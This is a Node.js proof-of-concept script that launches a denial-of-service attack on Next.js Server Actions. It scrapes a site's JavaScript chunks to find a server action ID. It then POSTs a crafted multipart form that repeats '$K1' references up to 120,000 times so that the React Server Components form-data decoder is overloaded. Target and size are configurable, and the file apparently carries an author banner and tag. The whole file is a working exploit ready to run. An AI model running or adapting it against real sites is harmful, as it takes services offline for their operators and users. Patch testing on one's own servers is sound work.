#!/usr/bin/env node
"use strict";

/*
   _____              .___                       _____         .__                   __
  /  _  \   ____    __| _/______   ______  _  __/     \   ____ |  |__ _____ __  _  _|  | __
 /  /_\  \ /    \  / __ |\_  __ \_/ __ \ \/ \/ /  \ /  \ /  _ \|  |  \\__  \\ \/ \/ /  |/ /
/    |    \   |  \/ /_/ | |  | \/\  ___/\     /    Y    (  <_> )   Y  \/ __ \\     /|    <
\____|__  /___|  /\____ | |__|    \___  >\/\_/\____|__  /\____/|___|  (____  /\/\_/ |__|_ \
        \/     \/      \/             \/              \/            \/     \/            \/
MaltegoIsNotAChicken
6tL"BDImisFCe9WEccS+Bl.D
*/

const crypto = require("crypto");

const ACTION_ID_PATTERN = /[a-f0-9]{42}/g;
const DEFAULT_ROUTER_STATE =
  '["",{"children":[["slug","test","d"],{"children":["__PAGE__",{},null,null]},null,null]},null,null,true]';
const BROWSER_HEADERS = {
  "User-Agent": "Mozilla/5.0",
  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "Accept-Language": "en-US,en;q=0.9",
  "Cache-Control": "no-cache",
};

function usage() {
  console.error("Usage: node poc-formdata-k-decoder-dos.js [target] [repeats] [entries] [value_size]");
  console.error("Example: node poc-formdata-k-decoder-dos.js http://localhost:3000/test 120000 3000 2");
}

function toInt(value, fallback, name) {
  const n = Number.parseInt(value ?? "", 10);
  if (Number.isFinite(n) && n >= 0) return n;
  if (fallback !== undefined) return fallback;
  throw new Error(`Invalid ${name}: ${value}`);
}

function normalizeTarget(input) {
  const raw = input || process.env.TARGET_URL || "http://localhost:3000/test";
  return new URL(raw.startsWith("http") ? raw : `http://${raw}`).toString();
}

async function fetchText(url, options = {}, timeoutMs = 10000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const res = await fetch(url, { ...options, signal: controller.signal });
    return { status: res.status, text: await res.text() };
  } finally {
    clearTimeout(timer);
  }
}

function extractJsUrls(html, baseUrl) {
  const urls = new Set();
  const srcPattern = /src=["']([^"']*\.js[^"']*)["']/g;
  const chunkPattern = /_next\/static\/chunks\/[^"'\s]+\.js/g;
  let m;
  while ((m = srcPattern.exec(html)) !== null) {
    urls.add(new URL(m[1], baseUrl).href);
  }
  while ((m = chunkPattern.exec(html)) !== null) {
    urls.add(new URL(m[0], baseUrl).href);
  }
  return [...urls];
}

async function discoverActionId(targetUrl) {
  const page = await fetchText(targetUrl, { headers: BROWSER_HEADERS });
  for (const jsUrl of extractJsUrls(page.text, targetUrl)) {
    try {
      const js = await fetchText(jsUrl, { headers: BROWSER_HEADERS });
      ACTION_ID_PATTERN.lastIndex = 0;
      let m;
      while ((m = ACTION_ID_PATTERN.exec(js.text)) !== null) {
        if (m[0].startsWith("40")) return m[0];
      }
    } catch {
      // ignore fetch failures for individual chunks
    }
  }
  return null;
}

function buildMultipart(repeats, entries, valueSize, preloadFields) {
  const boundary = `----poc-k-${crypto.randomBytes(6).toString("hex")}`;
  const chunks = [];

  const addField = (name, value) => {
    chunks.push(`--${boundary}\r\n`);
    chunks.push(`Content-Disposition: form-data; name=\"${name}\"\r\n\r\n`);
    chunks.push(value);
    chunks.push("\r\n");
  };

  const model = `[${Array(repeats).fill('"$K1"').join(",")}]`;
  const value = "x".repeat(valueSize);

  if (preloadFields) {
    for (let i = 0; i < entries; i += 1) addField(`1_${i}`, value);
    addField("0", model);
  } else {
    addField("0", model);
    for (let i = 0; i < entries; i += 1) addField(`1_${i}`, value);
  }

  chunks.push(`--${boundary}--\r\n`);
  const body = chunks.join("");
  return { boundary, body, bytes: Buffer.byteLength(body) };
}

async function main() {
  if (process.argv.includes("--help") || process.argv.includes("-h")) {
    usage();
    process.exit(0);
  }
  if (typeof fetch !== "function") throw new Error("Node.js 18+ required (global fetch).");

  const target = normalizeTarget(process.argv[2]);
  const repeats = toInt(process.argv[3], toInt(process.env.REPEATS, 120000, "REPEATS"), "repeats");
  const entries = toInt(process.argv[4], toInt(process.env.ENTRIES, 3000, "ENTRIES"), "entries");
  const valueSize = toInt(process.argv[5], toInt(process.env.VALUE_SIZE, 2, "VALUE_SIZE"), "value_size");
  const maxBody = toInt(process.env.MAX_BODY, 1_000_000, "MAX_BODY");
  const preloadFields = process.env.PRELOAD_FIELDS !== "0";

  const actionId = process.env.NEXT_ACTION || process.env.ACTION_ID || (await discoverActionId(target));
  if (!actionId) throw new Error("Could not discover action ID. Set NEXT_ACTION to override.");

  const payload = buildMultipart(repeats, entries, valueSize, preloadFields);
  if (payload.bytes > maxBody) {
    throw new Error(`Payload ${payload.bytes} bytes exceeds MAX_BODY ${maxBody}.`);
  }

  const routerState = process.env.NEXT_ROUTER_STATE_TREE || DEFAULT_ROUTER_STATE;
  const started = Date.now();
  const res = await fetch(target, {
    method: "POST",
    headers: {
      Accept: "text/x-component",
      "Content-Type": `multipart/form-data; boundary=${payload.boundary}`,
      "Next-Action": actionId,
      "Next-Router-State-Tree": routerState,
      Origin: new URL(target).origin,
      Referer: target,
    },
    body: payload.body,
  });

  const body = await res.text();
  console.log(
    JSON.stringify(
      {
        target,
        actionId,
        repeats,
        entries,
        valueSize,
        preloadFields,
        payloadBytes: payload.bytes,
        status: res.status,
        elapsedMs: Date.now() - started,
        bodyPreview: body.slice(0, 300),
      },
      null,
      2
    )
  );
}

main().catch((err) => {
  console.error(err.message || err);
  process.exit(1);
});
